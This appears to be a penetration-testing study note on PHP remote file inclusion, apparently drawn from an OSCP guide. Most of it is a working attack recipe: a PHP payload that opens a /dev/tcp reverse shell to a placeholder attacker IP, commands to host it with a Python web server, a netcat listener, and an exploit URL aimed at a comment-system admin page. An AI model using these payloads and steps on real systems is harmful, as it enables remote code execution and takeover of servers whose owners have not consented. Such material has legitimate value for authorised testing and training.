PHP Remote File Inclusion
***************************

A remote file inclusion vulnerability lets the attacker execute a script on the target-machine even though it is not even hosted on that machine.

RFI's are less common than LFI. Because in order to get them to work the developer must have edited the `php.ini` configuration file.

**This method only works with PHP before version 5.3**

So you have an unsanitized parameter, like this:

.. code-block:: console

        <?php echo system("0<&196;exec 196<>/dev/tcp/<Attacker_IP>/<Attacker_Port>; sh <&196 >&196 2>&196"); ?>

This helps create a `reverse shell` to the attack server. **Make sure this is a txt file and not a PHP file**

You then would make a http server on the attacker machine

.. code-block:: console

   python3 -m http.server 80

Then you would download the file using curl

.. code-block:: console

   curl http://<Attacker_IP>/<created_txt_file_above>

You would then create a netcat listeer to make sure you retreive the reverse shell.

.. code-block:: console

   nc -lvnp 443
   
In the url you would type something similar in the following

.. code-block:: console

        https://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=http://<Attacker_IP>/<file_created.txt>?

You then would do a `bash -i` to see a normal looking bash shell.

https://sushant747.gitbooks.io/total-oscp-guide/content/remote_file_inclusion.html
